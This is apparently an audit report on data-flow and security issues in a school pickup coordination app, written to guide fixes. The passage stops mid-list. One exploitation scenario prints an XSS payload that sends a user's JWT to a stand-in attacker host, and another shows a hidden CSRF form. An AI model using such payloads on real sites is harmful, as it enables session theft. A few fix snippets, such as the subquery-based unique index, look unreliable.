# Data Flow Issues Analysis - AllôBye System

**Date**: 2025-11-04
**Analyzer**: Traceur de Flux de Données
**Codebase**: AllôBye School Pickup Coordination System

---

## Executive Summary

This document catalogs all **data flow issues** detected in the AllôBye system, categorized by severity and impact. Each issue includes:

- **Root Cause Analysis**
- **Exploitation Scenario** (for security issues)
- **Impact Assessment** (performance, security, correctness)
- **Recommended Fixes** with code examples

**Critical Findings**:
- 🔴 **5 Critical Issues**: Security vulnerabilities and data loss risks
- 🟠 **8 High Priority Issues**: Race conditions and consistency problems
- 🟡 **12 Medium Priority Issues**: Performance bottlenecks and code quality
- 🟢 **7 Low Priority Issues**: Minor optimizations and technical debt

---

## Severity Classification

| Severity | Criteria | SLA |
|----------|----------|-----|
| 🔴 **Critical** | Security vulnerability, data loss, system unavailability | Fix within 1 week |
| 🟠 **High** | Race conditions, data corruption, significant performance degradation | Fix within 1 month |
| 🟡 **Medium** | Performance bottlenecks, user experience issues | Fix within 3 months |
| 🟢 **Low** | Code quality, technical debt, minor optimizations | Fix when convenient |

---

## 🔴 Critical Issues

### CRITICAL-01: JWT Tokens in localStorage (XSS Vulnerability)

**Category**: Security - Authentication

**Location**: `/src/allobye-dashboard/index.jsx` (lines 19, 92)

**Issue**:
```javascript
// Tokens stored in localStorage (accessible to any JavaScript)
localStorage.setItem("allobye_token", token);
localStorage.setItem("allobye_user", JSON.stringify(user));
```

**Root Cause**:
- JWT access tokens stored in `localStorage` are vulnerable to XSS attacks
- Any malicious JavaScript (injected via XSS) can read `localStorage.getItem("allobye_token")`
- Tokens include user email, role, and session validity

**Exploitation Scenario**:
1. Attacker finds XSS vulnerability (e.g., unescaped user input in React component)
2. Inject malicious script: `<img src=x onerror="fetch('https://evil.com?token='+localStorage.getItem('allobye_token'))">`
3. Script exfiltrates JWT token to attacker's server
4. Attacker can impersonate user until token expires (1 hour)

**Impact**:
- **Confidentiality**: User session stolen
- **Integrity**: Attacker can perform actions as victim (schedule pickups, declare emergencies)
- **Compliance**: GDPR violation (personal data exposure)

**Recommended Fix**:

**Option 1: Use HttpOnly Cookies** (Best)
```javascript
// Backend sets cookie with HttpOnly flag
res.setHeader('Set-Cookie', `allobye_token=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`);

// Frontend doesn't need to touch token (sent automatically)
// Remove all localStorage.getItem/setItem("allobye_token") calls
```

**Option 2: Use sessionStorage** (Better than localStorage)
```javascript
// sessionStorage cleared when tab closes, not accessible across tabs
sessionStorage.setItem("allobye_token", token);
```

**Option 3: Implement Content Security Policy (CSP)**
```html
<!-- In HTML <head> -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.supabase.co">
```

**Mitigation Until Fixed**:
1. Audit all React components for XSS vulnerabilities
2. Escape all user-provided content (use React's built-in escaping)
3. Implement short token expiry (15 minutes instead of 1 hour)

---

### CRITICAL-02: No Transaction Safety in Pickup Creation

**Category**: Data Integrity

**Location**: `/allobye_server_python/main.py` (lines 449-467)

**Issue**:
```python
# Insert pickup
response = supabase.table("pickups").insert(pickup_data).execute()

# Insert children (separate transactions!)
for child_id in child_ids:
    supabase.table("pickup_children").insert({
        "pickup_id": pickup_id,
        "child_id": child_id,
    }).execute()
```

**Root Cause**:
- Multiple database operations executed as separate HTTP requests
- No explicit transaction wrapper
- If `pickup_children` insert fails, orphan `pickups` record exists

**Exploitation Scenario**:
1. Parent schedules pickup for 3 children
2. First 2 children linked successfully
3. Third child insert fails (network error, database constraint violation)
4. Pickup exists but only 2/3 children linked
5. School dashboard shows incomplete pickup
6. Third child not picked up!

**Impact**:
- **Data Integrity**: Orphan records, referential integrity violated
- **Operational**: Child safety risk (missing pickup)
- **User Trust**: System appears broken

**Recommended Fix**:

**Option 1: Use PostgreSQL Function** (Best)
```sql
-- In schema.sql
CREATE OR REPLACE FUNCTION create_pickup_with_children(
    p_pickup_id UUID,
    p_pickup_person_id UUID,
    p_scheduled_time TIMESTAMPTZ,
    p_status TEXT,
    p_notes TEXT,
    p_child_ids UUID[]
) RETURNS JSON AS $$
DECLARE
    v_pickup_record JSON;
    v_child_id UUID;
BEGIN
    -- Single atomic transaction
    INSERT INTO pickups (id, pickup_person_id, scheduled_time, status, notes)
    VALUES (p_pickup_id, p_pickup_person_id, p_scheduled_time, p_status, p_notes)
    RETURNING row_to_json(pickups.*) INTO v_pickup_record;

    -- Link children
    FOREACH v_child_id IN ARRAY p_child_ids LOOP
        INSERT INTO pickup_children (pickup_id, child_id)
        VALUES (p_pickup_id, v_child_id);
    END LOOP;

    RETURN v_pickup_record;
EXCEPTION
    WHEN OTHERS THEN
        RAISE;  -- Rollback entire transaction
END;
$$ LANGUAGE plpgsql;
```

```python
# In main.py
result = supabase.rpc("create_pickup_with_children", {
    "p_pickup_id": pickup_id,
    "p_pickup_person_id": pickup_person_id,
    "p_scheduled_time": scheduled_time,
    "p_status": "confirmed",
    "p_notes": notes,
    "p_child_ids": child_ids,
}).execute()
```

**Option 2: Use Supabase SDK Transaction** (if supported)
```python
# Check if Supabase Python SDK supports transactions
with supabase.transaction():
    supabase.table("pickups").insert(pickup_data).execute()
    for child_id in child_ids:
        supabase.table("pickup_children").insert({...}).execute()
```

**Mitigation Until Fixed**:
1. Add retry logic for failed `pickup_children` inserts
2. Implement cleanup job to detect orphan `pickups` records
3. Add `CHECK (SELECT COUNT(*) FROM pickup_children WHERE pickup_id = NEW.id) > 0` constraint (but this prevents initial insert)

---

### CRITICAL-03: Plaintext Password Transmission

**Category**: Security - Data in Transit

**Location**: `/src/allobye-dashboard/auth-screen.jsx` (line 38-41)

**Issue**:
```javascript
const result = await window.openai.callTool("auth-login", {
  email: formData.email,
  password: formData.password,  // Plaintext password!
});
```

**Root Cause**:
- Password sent from React → MCP server as plaintext string
- While HTTPS encrypts the connection, password is visible in:
  - Browser DevTools Network tab
  - JavaScript memory
  - MCP server logs (if accidentally logged)

**Exploitation Scenario**:
1. Developer accidentally logs MCP request: `logger.info(f"Login request: {arguments}")`
2. Password written to log file in plaintext
3. Log file accessible to operations team, backups, log aggregation services
4. Password leaked

**Impact**:
- **Confidentiality**: Password exposure
- **Compliance**: PCI-DSS, SOC 2 violation

**Note**: This is **partially acceptable** because:
- Passwords **should** be sent plaintext over HTTPS (industry standard)
- Server-side hashing (bcrypt) happens at Supabase Auth layer
- Issue is more about **logging and memory exposure**

**Recommended Fix**:

**Option 1: Ensure No Logging**
```python
# In main.py - NEVER log arguments for auth tools
async def _handle_auth_login(arguments: Dict[str, Any]) -> types.CallToolResult:
    # DO NOT LOG: logger.info("Login request", arguments=arguments)
    # Only log sanitized data:
    logger.info("Login attempt", email=arguments.get("email"))  # OK
```

**Option 2: Client-Side Hashing** (not recommended - adds complexity)
```javascript
// Hash password before sending (use bcrypt.js)
import bcrypt from 'bcryptjs';
const hashedPassword = bcrypt.hashSync(formData.password, 10);

await window.openai.callTool("auth-login", {
  email: formData.email,
  passwordHash: hashedPassword,  // Send hash instead
});
```
**Problem**: Server still needs to compare hashes, requires bcrypt config sync.

**Mitigation Until Fixed**:
1. Audit all logging statements for `arguments` logging in auth handlers
2. Implement log sanitization (redact `password` field)
3. Enable TLS 1.3 for stronger encryption
4. Use memory-safe strings (clear after use) - difficult in Python

---

### CRITICAL-04: No CSRF Protection on MCP Endpoints

**Category**: Security - Cross-Site Request Forgery

**Location**: `/allobye_server_python/main.py` (stateless HTTP server)

**Issue**:
- MCP server accepts requests without CSRF tokens
- JWT in request body, but no origin validation
- Vulnerable to CSRF attacks if user is authenticated

**Exploitation Scenario**:
1. User logs into AllôBye (token in localStorage)
2. User visits malicious website `evil.com`
3. `evil.com` contains hidden form:
```html
<form id="csrf" action="https://allobye.com/mcp" method="POST">
  <input name="jsonrpc" value="2.0">
  <input name="method" value="tools/call">
  <input name="params" value='{"name":"emergency-declare","arguments":{...}}'>
</form>
<script>
  // Auto-submit form with user's stored token
  const token = localStorage.getItem("allobye_token");  // Fails due to CORS, but...
  // If token in cookie, this would work:
  document.getElementById("csrf").submit();
</script>
```

**Current Protection**:
- ✅ Token in `localStorage` (not sent automatically by browser)
- ✅ CORS policy (prevents cross-origin requests)

**Risk**:
- ⚠️ If tokens moved to cookies (per CRITICAL-01 fix), CSRF becomes exploitable
- ⚠️ If CORS misconfigured (`allow_origins=["*"]`), CSRF possible

**Recommended Fix**:

**Option 1: Use SameSite Cookies** (if implementing cookie auth)
```python
# In cookie setup
Set-Cookie: allobye_token=...; SameSite=Strict; HttpOnly; Secure
```

**Option 2: Implement CSRF Tokens**
```python
# Generate CSRF token on login
csrf_token = secrets.token_urlsafe(32)
# Store in session or return to client

# Validate on every state-changing request
def validate_csrf(request):
    csrf_from_header = request.headers.get("X-CSRF-Token")
    csrf_from_session = get_session_csrf()
    if csrf_from_header != csrf_from_session:
        raise CSRFError()
```

**Option 3: Check Referer Header**
```python
# In Starlette middleware
@app.middleware("http")
async def check_referer(request, call_next):
    referer = request.headers.get("referer")
    if not referer or not referer.startswith("https://allobye.com"):
        return JSONResponse({"error": "Invalid origin"}, status_code=403)
    return await call_next(request)
```

**Mitigation Until Fixed**:
1. Keep tokens in `localStorage` (not cookies)
2. Ensure CORS policy is strict (`allow_origins=["https://chat.openai.com"]`)
3. Add `Origin` header validation

---

### CRITICAL-05: Emergency Auto-Dismiss Can Be Missed

**Category**: Safety - User Experience

**Location**: `/src/allobye-dashboard/dashboard.jsx` (lines 124-126)

**Issue**:
```javascript
setState({ ...state, alert: { /* emergency data */ } });

// Auto-dismiss after 30 seconds
setTimeout(() => {
  setState({ ...state, alert: null });
}, 30000);
```

**Root Cause**:
- Emergency alerts auto-dismiss after 30 seconds (client-side timer)
- If staff member looks away during 30-second window, alert disappears
- No persistent indication that emergency occurred
- No acknowledgment requirement

**Exploitation Scenario**:
1. Parent declares emergency: "Sophie has peanut allergy, pickup person changed"
2. School tablet displays alert for 30 seconds
3. Staff member stepped away from desk
4. Alert auto-dismisses
5. Staff unaware of critical allergy information
6. Original pickup person arrives (not authorized to administer EpiPen)
7. Medical emergency

**Impact**:
- **Safety**: Child safety risk
- **Liability**: School liable for not following emergency instructions
- **Operational**: Staff unaware of critical changes

**Recommended Fix**:

**Option 1: Require Acknowledgment** (Best)
```javascript
setState({
  ...state,
  alert: {
    ...payload.new,
    requiresAck: true,  // Flag that needs acknowledgment
  },
});

// DO NOT auto-dismiss if requiresAck is true
// Only dismiss when staff clicks "Acknowledge" button
```

```javascript
// EmergencyAlert component
<div className="emergency-alert critical">
  <p>{alert.context}</p>
  <button onClick={handleAcknowledge}>
    Acknowledge and Dismiss
  </button>
  {/* No auto-dismiss! */}
</div>
```

**Option 2: Persistent Alert Log**
```javascript
const [alertHistory, setAlertHistory] = useState([]);

// On emergency received
setAlertHistory(prev => [...prev, {
  ...payload.new,
  receivedAt: new Date(),
  acknowledged: false,
}]);

// Show badge with unacknowledged count
<div className="alert-badge">
  {alertHistory.filter(a => !a.acknowledged).length} unread
</div>
```

**Option 3: Sound Notification**
```javascript
// Play alert sound that repeats until acknowledged
const audio = new Audio('/alert-sound.mp3');
audio.loop = true;
audio.play();

// Stop on acknowledgment
const handleAcknowledge = () => {
  audio.pause();
  dismissAlert();
};
```

**Mitigation Until Fixed**:
1. Increase auto-dismiss timeout to 2 minutes
2. Add visual indicator (flashing banner) for duration
3. Log all emergencies to database with `resolved=FALSE` flag
4. Implement daily report of unresolved emergencies

---

## 🟠 High Priority Issues

### HIGH-01: Race Condition in Realtime vs MCP Data Merge

**Category**: Data Consistency

**Location**: `/src/allobye-dashboard/dashboard.jsx` (line 21)

**Issue**:
```javascript
// Priority: MCP data overrides Realtime data
const pickups = metadata?.pickups || realtimePickups || [];
```

**Root Cause**:
- MCP tool data (`metadata.pickups`) fetched periodically (every 30s)
- Realtime updates (`realtimePickups`) arrive instantly via WebSocket
- If MCP response arrives after Realtime update, stale data displayed

**Timeline**:
```
T0:   User updates pickup status → "in_progress"
T1:   MCP tool called (returns old data with status="pending")
T2:   Realtime WebSocket receives update (status="in_progress")
      → setRealtimePickups([{status: "in_progress"}])
T3:   MCP response arrives (status="pending")
      → metadata.pickups = [{status: "pending"}]
T4:   UI renders stale data (status="pending") ❌
```

**Impact**:
- **User Experience**: UI shows outdated information
- **Operational**: Staff make decisions based on wrong data
- **Trust**: Users lose confidence in system

**Recommended Fix**:

**Option 1: Timestamp-Based Merge** (Best)
```javascript
const pickups = useMemo(() => {
  const mcpPickups = metadata?.pickups || [];
  const realtimeMap = new Map(realtimePickups.map(p => [p.id, p]));

  return mcpPickups.map(pickup => {
    const realtimeVersion = realtimeMap.get(pickup.id);

    // Compare updated_at timestamps
    if (realtimeVersion &&
        new Date(realtimeVersion.updated_at) > new Date(pickup.updated_at)) {
      return realtimeVersion;  // Realtime is newer
    }

    return pickup;  // MCP is newer or same
  }).concat(
    // Add Realtime pickups not in MCP data
    Array.from(realtimeMap.values()).filter(
      rt => !mcpPickups.find(mcp => mcp.id === rt.id)
    )
  ).sort((a, b) => new Date(a.scheduled_time) - new Date(b.scheduled_time));
}, [metadata, realtimePickups]);
```

**Option 2: Version Numbers**
```sql
-- Add version column to pickups table
ALTER TABLE pickups ADD COLUMN version INTEGER DEFAULT 1;

-- Increment on every update
CREATE TRIGGER increment_version BEFORE UPDATE ON pickups
FOR EACH ROW EXECUTE FUNCTION increment_version();
```

```javascript
// Merge by version (higher version wins)
const mergedPickup = realtimeVersion.version > mcpVersion.version
  ? realtimeVersion
  : mcpPickup;
```

**Option 3: Disable MCP Polling When Realtime Active**
```javascript
useEffect(() => {
  // Only poll if Realtime disconnected
  if (!isRealtimeConnected) {
    const interval = setInterval(() => {
      window.openai.callTool("school-dashboard-fetch", {...});
    }, 30000);
    return () => clearInterval(interval);
  }
}, [isRealtimeConnected]);
```

---

### HIGH-02: No Duplicate Pickup Prevention

**Category**: Data Integrity

**Location**: `/allobye_server_python/main.py` (pickup creation logic)

**Issue**:
- No unique constraint preventing multiple active pickups for same child at same time
- Parent can schedule 2 pickups for same child at overlapping times

**Exploitation Scenario**:
1. Parent schedules pickup for Sophie at 3:00pm by grandma
2. Parent forgets and schedules again at 3:15pm by dad
3. Both pickups exist in system
4. School confused about who to release child to
5. Potential custody dispute

**Impact**:
- **Safety**: Wrong person may pick up child
- **Legal**: Custody violation risk
- **Operational**: School staff confusion

**Recommended Fix**:

**Option 1: Unique Partial Index** (Best)
```sql
-- Prevent overlapping active pickups for same child
CREATE UNIQUE INDEX idx_no_duplicate_active_pickups
ON pickup_children (child_id)
WHERE EXISTS (
    SELECT 1 FROM pickups
    WHERE pickups.id = pickup_children.pickup_id
    AND pickups.status IN ('pending', 'confirmed', 'in_progress')
);
```

**Option 2: Application-Level Check**
```python
# Before creating pickup
async def check_existing_pickups(child_id: str, scheduled_time: str) -> bool:
    """Check if child has active pickup within 1 hour window."""
    existing = supabase.table("pickups").select(
        "*, pickup_children!inner(*)"
    ).eq(
        "pickup_children.child_id", child_id
    ).in_(
        "status", ["pending", "confirmed", "in_progress"]
    ).gte(
        "scheduled_time",
        (datetime.fromisoformat(scheduled_time) - timedelta(hours=1)).isoformat()
    ).lte(
        "scheduled_time",
        (datetime.fromisoformat(scheduled_time) + timedelta(hours=1)).isoformat()
    ).execute()

    return len(existing.data) > 0

# In handler
if await check_existing_pickups(child_id, scheduled_time):
    return error_response("Child already has active pickup at this time")
```

---

### HIGH-03: N+1 Query in Authorization Checks

**Category**: Performance

**Location**: `/allobye_server_python/main.py` (lines 1052-1062)

**Issue**:
```python
for child_id in payload.child_ids:
    if not await verify_parent_owns_child(user.id, child_id):
        return error_response()
```

**Root Cause**:
- Authorization check executes one query per child
- 10 children = 10 database round-trips
- Each round-trip: 50-200ms
- Total latency: 500ms - 2 seconds

**Impact**:
- **Performance**: Slow response times
- **Scalability**: Database bottleneck
- **User Experience**: Perceived lag

**Recommended Fix**:

**Option 1: Batch Query** (Best)
```python
async def verify_parent_owns_children(parent_id: str, child_ids: List[str]) -> bool:
    """Check if parent owns ALL children in single query."""
    response = supabase.table("parent_children").select("child_id").eq(
        "parent_id", parent_id
    ).in_(
        "child_id", child_ids
    ).execute()

    # Check if all requested children are in result
    owned_child_ids = {row["child_id"] for row in response.data}
    return all(cid in owned_child_ids for cid in child_ids)

# In handler
if not await verify_parent_owns_children(user.id, payload.child_ids):
    return error_response("Not authorized for one or more children")
```

**Performance Improvement**:
- Before: 10 queries × 100ms = 1000ms
- After: 1 query × 100ms = 100ms
- **10x speedup**

---

### HIGH-04: Monitoring Metrics Memory Leak

**Category**: Resource Management

**Location**: `/allobye_server_python/monitoring.py` (lines 214-220)

**Issue**:
```python
self.tool_metrics: Dict[str, ToolMetrics] = defaultdict(ToolMetrics)
self.recent_errors: List[Dict[str, Any]] = []
self.recent_requests: List[Dict[str, Any]] = []
self._alerts: List[Dict[str, Any]] = []
```

**Root Cause**:
- Metrics accumulate indefinitely (only bounded by list slicing in read methods)
- Long-running server accumulates gigabytes of metrics
- Python garbage collector can't reclaim memory (still referenced)

**Exploitation Scenario**:
1. Server runs for 30 days
2. 1000 requests/hour × 24 hours × 30 days = 720,000 requests
3. Each request entry: ~200 bytes
4. Total memory: 720,000 × 200 bytes = **144 MB just for recent_requests**
5. Add tool_metrics, alerts, errors: **~500 MB total**
6. Server OOM crash

**Impact**:
- **Availability**: Server crashes after weeks of uptime
- **Performance**: Garbage collection pauses increase
- **Scalability**: Cannot run multiple instances (each leaks memory)

**Recommended Fix**:

**Option 1: Use collections.deque with maxlen** (Best)
```python
from collections import deque

class MetricsCollector:
    def __init__(self, config: MonitoringConfig):
        # Circular buffers with fixed size
        self.recent_errors = deque(maxlen=100)
        self.recent_requests = deque(maxlen=1000)
        self._alerts = deque(maxlen=100)

    def record_tool_call(self, ...):
        # Automatically drops oldest when full
        self.recent_requests.append({...})
```

**Option 2: Time-Based Expiry**
```python
def record_tool_call(self, ...):
    self.recent_requests.append({
        "timestamp": time.time(),
        ...
    })

    # Periodically clean old entries
    cutoff = time.time() - 3600  # Keep last hour
    self.recent_requests = [
        req for req in self.recent_requests
        if req["timestamp"] > cutoff
    ]
```

**Option 3: Use External Metrics Store** (Best for production)
```python
# Push metrics to Redis/StatsD instead of storing in-memory
def record_tool_call(self, tool_name, latency_ms, success, error):
    # Push to Redis
    redis.hincrby(f"tool_metrics:{tool_name}", "call_count", 1)
    redis.hincrby(f"tool_metrics:{tool_name}", "total_latency_ms", latency_ms)

    # Or push to StatsD
    statsd.increment(f"allobye.tool.{tool_name}.calls")
    statsd.timing(f"allobye.tool.{tool_name}.latency", latency_ms)
```

---

### HIGH-05: No Concurrent Request Handling Safety

**Category**: Concurrency

**Location**: `/allobye_server_python/monitoring.py` (metric updates)

**Issue**:
```python
metrics.call_count += 1  # Not thread-safe!
```

**Root Cause**:
- Python GIL (Global Interpreter Lock) provides some safety
- But `uvicorn` can use multiple workers (`--workers 4`)
- Each worker has separate `MetricsCollector` instance
- Concurrent updates within same worker still possible (async)

**Exploitation Scenario**:
1. Two requests arrive simultaneously
2. Both read `metrics.call_count = 100`
3. Both increment: `metrics.call_count = 100 + 1`
4. Both write: `metrics.call_count = 101`
5. **Lost update**: Should be 102, but recorded as 101

**Impact**:
- **Data Accuracy**: Metrics undercount actual requests
- **Monitoring**: False sense of low load
- **Alerting**: Thresholds not triggered when they should be

**Recommended Fix**:

**Option 1: Use threading.Lock**
```python
import threading

class MetricsCollector:
    def __init__(self, config):
        self._lock = threading.Lock()
        self.tool_metrics = defaultdict(ToolMetrics)

    def record_tool_call(self, tool_name, latency_ms, success, error):
        with self._lock:
            metrics = self.tool_metrics[tool_name]
            metrics.call_count += 1
            # ... other updates
```

**Option 2: Use atomic operations (if available)**
```python
from multiprocessing import Value

class MetricsCollector:
    def __init__(self, config):
        self.total_requests = Value('i', 0)  # Shared atomic integer

    def increment_requests(self):
        with self.total_requests.get_lock():
            self.total_requests.value += 1
```

**Option 3: One MetricsCollector per request (no sharing)**
```python
# Create new instance for each request (no shared state)
async def _call_tool_request_monitored(req):
    metrics = MetricsCollector(config)
    # ... use metrics
    # Aggregate at end via external store
```

---

### HIGH-06: WebSocket Reconnection Not Implemented

**Category**: Reliability

**Location**: `/src/allobye-dashboard/dashboard.jsx` (Realtime subscription)

**Issue**:
```javascript
const channel = supabase.channel("pickups-changes").on(...).subscribe();
```

**Root Cause**:
- No reconnection logic if WebSocket connection drops
- Network interruption → permanent disconnection
- No user notification of disconnection
- UI continues showing stale data

**Exploitation Scenario**:
1. School tablet connected via Wi-Fi
2. Wi-Fi router restarts (1 minute downtime)
3. WebSocket connection lost
4. No reconnection attempt
5. Dashboard shows last known data (10 minutes old)
6. Staff unaware pickups have changed
7. Wrong child released to wrong person

**Impact**:
- **Safety**: Outdated information leads to errors
- **User Experience**: Silent failures
- **Operational**: Staff lose trust in system

**Recommended Fix**:

**Option 1: Implement Reconnection with Exponential Backoff**
```javascript
const [isRealtimeConnected, setIsRealtimeConnected] = useState(false);
const reconnectAttempts = useRef(0);

const setupRealtimeSubscription = async () => {
  try {
    const supabase = createClient(...);

    const channel = supabase.channel("pickups-changes")
      .on("postgres_changes", {...}, (payload) => { /* ... */ })
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          setIsRealtimeConnected(true);
          reconnectAttempts.current = 0;
        } else if (status === "CLOSED" || status === "CHANNEL_ERROR") {
          setIsRealtimeConnected(false);

          // Exponential backoff: 1s, 2s, 4s, 8s, ... max 60s
          const delay = Math.min(
            1000 * Math.pow(2, reconnectAttempts.current),
            60000
          );

          setTimeout(() => {
            reconnectAttempts.current++;
            setupRealtimeSubscription();  // Retry
          }, delay);
        }
      });

    return () => channel.unsubscribe();
  } catch (error) {
    console.error("Realtime subscription error:", error);
    setIsRealtimeConnected(false);
  }
};
```

**Option 2: Show Disconnection Alert**
```javascript
{!isRealtimeConnected && (
  <div className="connection-alert">
    ⚠️ Connexion temps réel perdue. Reconnexion en cours...
  </div>
)}
```

**Option 3: Fallback to Polling When Disconnected**
```javascript
useEffect(() => {
  if (!isRealtimeConnected) {
    // Increase polling frequency when WebSocket down
    const interval = setInterval(() => {
      window.openai.callTool("school-dashboard-fetch", {...});
    }, 5000);  // Every 5 seconds instead of 30
    return () => clearInterval(interval);
  }
}, [isRealtimeConnected]);
```

---

### HIGH-07: No Request Deduplication

**Category**: Efficiency

**Location**: React auto-refresh logic

**Issue**:
- Multiple tabs/widgets can call same tool simultaneously
- No deduplication mechanism
- Wastes server resources and database connections

**Impact**:
- **Performance**: Redundant queries
- **Cost**: Higher Supabase API usage
- **Scalability**: Database connection pool exhaustion

**Recommended Fix**:
```javascript
// Request cache with 5-second TTL
const requestCache = new Map();

async function callToolWithCache(toolName, args) {
  const cacheKey = JSON.stringify({toolName, args});
  const cached = requestCache.get(cacheKey);

  if (cached && Date.now() - cached.timestamp < 5000) {
    return cached.result;  // Return cached result
  }

  const result = await window.openai.callTool(toolName, args);
  requestCache.set(cacheKey, {result, timestamp: Date.now()});

  return result;
}
```

---

### HIGH-08: Emergency Alerts Not Persisted Across Reloads

**Category**: User Experience

**Location**: React state in `dashboard.jsx`

**Issue**:
```javascript
const [state, setState] = useWidgetState({
  alert: null,  // Lost on page reload
});
```

**Root Cause**:
- Emergency alerts only stored in React state
- Browser refresh clears alert
- No persistent storage or database flag

**Impact**:
- **Operational**: Staff miss critical alerts after refresh
- **Safety**: Emergency information lost

**Recommended Fix**:
```javascript
// Check for active emergencies on mount
useEffect(() => {
  const fetchActiveEmergencies = async () => {
    const emergencies = await supabase
      .table("emergencies")
      .select("*")
      .eq("resolved", false)
      .gte("created_at", new Date(Date.now() - 3600000).toISOString())  // Last hour
      .execute();

    if (emergencies.data.length > 0) {
      setState({ ...state, alert: emergencies.data[0] });
    }
  };

  fetchActiveEmergencies();
}, []);
```

---

## 🟡 Medium Priority Issues

### MEDIUM-01: No Input Sanitization for User-Provided Strings

**Category**: Security - XSS Prevention

**Location**: All components rendering user input

**Issue**:
```javascript
// If context contains <script>alert('XSS')</script>, React will escape it
// But if used in dangerouslySetInnerHTML, vulnerable
<div dangerouslySetInnerHTML={{__html: pickup.notes}} />  // ⚠️ If anywhere
```

**Recommended Fix**:
```javascript
import DOMPurify from 'dompurify';

// Sanitize before rendering
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(pickup.notes)}} />
```

---

### MEDIUM-02: No Pagination on Dashboard Data

**Category**: Performance

**Issue**:
- School dashboard returns all pickups for the day (could be 200+)
- Large JSON payloads (100+ KB)
- Slow rendering with many PickupCard components

**Recommended Fix**:
```python
# Add pagination parameters
class SchoolDashboardInput(BaseModel):
    school_id: str
    date: Optional[str]
    time_window: str
    page: int = Field(default=1, ge=1)
    page_size: int = Field(default=20, le=100)

# In handler
offset = (payload.page - 1) * payload.page_size
pickups = await get_school_pickups(
    school_id=payload.school_id,
    limit=payload.page_size,
    offset=offset,
)
```

---

### MEDIUM-03: No UUID Format Validation

**Category**: Data Validation

**Issue**:
```python
child_ids: List[str]  # Should be List[UUID]
```

**Recommended Fix**:
```python
from uuid import UUID

class PickupScheduleInput(BaseModel):
    child_ids: List[UUID]  # Pydantic auto-validates UUID format
    pickup_person_id: UUID
```

---

### MEDIUM-04: No DateTime Validation

**Category**: Data Validation

**Issue**:
```python
scheduled_time: str  # Should be datetime
```

**Recommended Fix**:
```python
from datetime import datetime

class PickupScheduleInput(BaseModel):
    scheduled_time: datetime  # Pydantic parses ISO 8601

    @field_validator('scheduled_time')
    def must_be_future(cls, v):
        if v < datetime.now(v.tzinfo):
            raise ValueError('Scheduled time must be in the future')
        return v
```

---

### MEDIUM-05: Inefficient State Updates

**Category**: Performance

**Issue**:
```javascript
setState({...state, filter: "next_30min"});  // Creates new object every time
```

**Recommended Fix**:
```javascript
// Use functional update to avoid stale closures
setState(prevState => ({...prevState, filter: "next_30min"}));
```

---

### MEDIUM-06: No Rate Limiting

**Category**: Security - DoS Prevention

**Issue**:
- MCP server has no rate limiting
- Single user can spam requests (100/second)
- Exhausts database connections

**Recommended Fix**:
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.route("/mcp")
@limiter.limit("100/minute")
async def mcp_endpoint(request):
    # ...
```

---

### MEDIUM-07: No Monitoring Metrics Retention Policy

**Category**: Operations

**Issue**:
- Metrics never expire
- Old metrics skew averages
- No time-windowed aggregations

**Recommended Fix**:
```python
# Keep metrics per time window (hourly buckets)
class MetricsCollector:
    def __init__(self):
        self.hourly_metrics = {}  # {hour_timestamp: ToolMetrics}

    def record_tool_call(self, ...):
        current_hour = int(time.time() // 3600)
        if current_hour not in self.hourly_metrics:
            self.hourly_metrics[current_hour] = defaultdict(ToolMetrics)

        self.hourly_metrics[current_hour][tool_name].call_count += 1

        # Clean metrics older than 24 hours
        cutoff = current_hour - 24
        for hour in list(self.hourly_metrics.keys()):
            if hour < cutoff:
                del self.hourly_metrics[hour]
```

---

### MEDIUM-08: Monitoring Dashboard Has No Error Handling

**Category**: Reliability

**Issue**:
```javascript
const dashboardData = window.__ALLOBYE_MONITORING_DATA__ || getMockData();
```

**Recommended Fix**:
```javascript
try {
  const dashboardData = await fetchMonitoringData();
  setData(dashboardData);
} catch (error) {
  setError("Failed to load monitoring data");
  // Retry with exponential backoff
}
```

---

### MEDIUM-09: No Schema Versioning

**Category**: Maintainability

**Issue**:
- JSON responses have no version field
- Schema changes break old clients
- No backward compatibility

**Recommended Fix**:
```python
# Add version to all responses
return types.CallToolResult(
    content=[...],
    structuredContent={
        "version": "1.0",
        "data": {...}
    }
)
```

---

### MEDIUM-10: Clock Skew Not Handled

**Category**: Correctness

**Issue**:
```javascript
const diffMinutes = Math.round((scheduledTime - now) / 60000);
```

**Problem**: Client clock may be wrong (5 minutes fast/slow)

**Recommended Fix**:
```javascript
// Use server timestamp from response
const serverTime = new Date(metadata.server_timestamp);
const diffMinutes = Math.round((scheduledTime - serverTime) / 60000);
```

---

### MEDIUM-11: No Request Timeout

**Category**: Reliability

**Issue**:
- MCP tool calls have no timeout
- Hung requests block UI forever

**Recommended Fix**:
```javascript
const callToolWithTimeout = (toolName, args, timeout = 30000) => {
  return Promise.race([
    window.openai.callTool(toolName, args),
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Request timeout")), timeout)
    ),
  ]);
};
```

---

### MEDIUM-12: No Database Connection Pooling Config

**Category**: Performance

**Issue**:
- Supabase SDK uses default connection pool settings
- May not be optimized for AllôBye's workload

**Recommended Fix**:
```python
# Configure connection pool
supabase = create_client(
    url,
    key,
    options={
        "pool_config": {
            "max_size": 20,
            "min_size": 5,
            "max_overflow": 10,
        }
    }
)
```

---

## 🟢 Low Priority Issues

### LOW-01: Inconsistent Error Messages (French vs English)

**Category**: User Experience

**Issue**:
- Some errors in French ("Erreur de validation")
- Some in English ("Invalid credentials")

**Recommended Fix**:
- Use i18n library (react-intl, i18next)
- Consistent language based on user preference

---

### LOW-02: No Dark Mode Support

**Category**: User Experience

**Issue**:
- Dashboard hardcoded to light theme
- Difficult to use in low-light conditions (school staff at night)

**Recommended Fix**:
```css
@media (prefers-color-scheme: dark) {
  .allobye-dashboard {
    background: #1a1a1a;
    color: #ffffff;
  }
}
```

---

### LOW-03: Magic Numbers in Code

**Category**: Code Quality

**Issue**:
```javascript
setTimeout(() => { /* ... */ }, 30000);  // What's 30000?
```

**Recommended Fix**:
```javascript
const ALERT_AUTO_DISMISS_MS = 30000;
setTimeout(() => { /* ... */ }, ALERT_AUTO_DISMISS_MS);
```

---

### LOW-04: No TypeScript in React Components

**Category**: Code Quality

**Issue**:
- React components are `.jsx` (JavaScript)
- No type safety

**Recommended Fix**:
